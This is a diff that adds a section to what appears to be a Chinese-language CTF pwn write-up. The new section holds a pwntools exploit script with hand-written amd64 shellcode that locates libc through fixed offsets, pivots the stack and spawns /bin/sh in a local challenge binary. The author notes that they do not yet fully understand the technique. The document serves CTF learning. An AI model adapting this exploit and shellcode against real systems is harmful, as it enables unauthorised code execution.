@@ -124,3 +124,44 @@ payload+=push(ord("s"))+store(0)+push(ord("h"))+store(1)
 原本的操作是输出栈中的内容，那么我们把`/sh`写入栈中，就可以执行`system(/sh)`
 
 **OVER**
+
+## shell_for_another_shell
+
+不是特别会，等会了再回来补一下
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+libc = ELF("./libc.so.6")
+p = process('./pwn')
+#gdb.attach(p)
+
+shellcode = """
+    xor eax, eax
+    add r13, fs:0x0
+    lea r15, [rip]
+    sub r15, 0x15
+    add r13, 0x28c0
+    mov r14, r13
+    add r14, 0x222200
+    lea r14, [r14]
+    mov rbp, r14
+    mov rsp, r14
+    add r13, 0x40d70
+    add r13, 0x10000
+    xor rax, rax
+    mov rdi, r15
+    add rdi, 0x200
+    xor r15, r15
+    call r13
+"""
+shellcode = asm(shellcode)
+payload = shellcode.ljust(0x200-3,b'/')+b'/bin/sh\x00'
+p.sendline(payload)
+p.interactive()
+```
+
